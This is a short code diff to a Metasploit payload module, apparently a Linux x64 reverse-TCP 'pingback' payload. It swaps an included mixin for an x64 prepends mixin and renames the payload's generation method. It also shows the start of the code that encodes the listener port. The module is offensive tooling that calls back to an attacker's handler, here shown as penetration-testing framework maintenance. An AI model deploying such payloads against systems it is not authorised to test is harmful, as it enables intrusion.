@@ -9,7 +9,7 @@ module MetasploitModule
 
   CachedSize = 125
 
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X64::Prepends
   include Msf::Payload::Single
   include Msf::Payload::Pingback
   include Msf::Payload::Pingback::Options
@@ -25,7 +25,7 @@ module MetasploitModule
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::Pingback
     ))
-    def generate_stage
+    def generate(opts={})
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
       encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
